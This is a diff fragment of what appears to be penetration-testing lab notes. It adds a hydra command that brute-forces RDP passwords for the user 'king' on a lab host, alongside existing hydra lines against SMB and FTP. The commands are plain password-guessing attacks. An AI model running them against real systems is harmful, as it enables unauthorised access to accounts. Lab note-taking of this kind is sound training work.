@@ -30,6 +30,7 @@ sudo nbtscan 10.10.10.1-254
 ```sh
 hydra -L win32-users.txt -P /usr/share/wordlists/nmap.lst smb://10.10.10.16
 hydra -L win32-users.txt -P /usr/share/wordlists/nmap.lst ftp://10.10.10.16
+hydra -l king -P /usr/share/wordlists/nmap.lst rdp://10.10.10.16
 ```
 ## _enum4linux_
 
